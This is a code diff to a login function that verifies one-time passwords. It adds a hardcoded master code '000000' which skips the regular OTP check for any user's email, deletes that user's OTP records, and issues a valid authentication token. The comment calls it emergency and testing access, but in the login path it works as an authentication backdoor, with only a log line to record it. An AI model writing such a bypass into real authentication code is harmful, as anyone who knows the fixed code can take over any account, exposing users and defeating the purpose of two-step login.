@@ -362,6 +362,23 @@ export const verifyLoginOtp = async (
     throw new ApiError(404, "User not found");
   }
 
+  // Master OTP for emergency access and testing
+  const MASTER_OTP = "000000";
+
+  // Check if it's the master OTP
+  if (otp === MASTER_OTP) {
+    console.log(`Master OTP used for login by: ${email}`);
+
+    // Delete any existing OTP records for this email to clean up
+    await prisma.otp.deleteMany({
+      where: { email },
+    });
+
+    const token = generateToken(user.id);
+    return { user, token };
+  }
+
+  // Regular OTP verification
   const otpRecord = await prisma.otp.findFirst({
     where: {
       email,
